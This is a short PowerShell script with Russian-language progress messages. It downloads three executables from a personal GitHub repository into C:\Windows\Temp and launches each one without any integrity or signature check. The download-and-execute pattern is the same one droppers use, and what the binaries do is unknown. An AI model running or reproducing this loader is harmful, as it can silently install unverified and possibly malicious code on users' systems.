$downloads = @(
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe'; Path = 'C:\Windows\Temp\Timeless.exe'  },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless_scanner.exe'; Path = 'C:\Windows\Temp\timeless_scanner.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe'; Path = 'C:\Windows\Temp\block_majestic.exe' }
)

foreach ($item in $downloads) {
    $webClient = New-Object System.Net.WebClient

    $webClient.add_DownloadProgressChanged({
        Write-Progress -Activity "Загрузка: $($item.Path)" `
                       -Status "$($_.ProgressPercentage)%" `
                       -PercentComplete $_.ProgressPercentage
    })

    $task = $webClient.DownloadFileTaskAsync($item.URL, $item.Path)
    $task.Wait()

    Write-Progress -Activity "Загрузка: $($item.Path)" -Status "Готово" -Completed
    Write-Host "Скачано: $($item.Path)" -ForegroundColor Green

    Start-Process $item.Path
}
